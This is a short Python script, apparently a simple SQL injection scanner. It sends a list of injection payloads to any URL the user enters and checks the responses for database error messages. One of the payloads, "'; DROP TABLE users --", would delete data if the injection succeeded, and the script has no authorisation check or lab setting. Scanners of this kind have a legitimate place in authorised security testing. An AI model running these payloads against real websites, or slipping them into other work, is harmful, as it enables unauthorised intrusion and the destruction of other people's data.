import requests

# Common SQL injection payloads
payloads = [
    "'",
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
    "'; DROP TABLE users --"
]

# Common SQL error patterns
sql_errors = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax"
]

def get_response(url):
    try:
        response = requests.get(url, timeout=5)
        return response.text
    except:
        return ""


def scan_sql_injection(url):
    print(f"\n[+] Testing URL: {url}\n")

    for payload in payloads:
        test_url = url + payload
        print(f"[*] Testing payload: {payload}")

        response = get_response(test_url)

        for error in sql_errors:
            if error.lower() in response.lower():
                print(f"[VULNERABLE] SQL Injection detected!")
                print(f"[PAYLOAD] {payload}")
                return True

    print("[SAFE] No SQL Injection detected")
    return False


if __name__ == "__main__":
    target = input("Enter URL (with parameter): ")
    scan_sql_injection(target)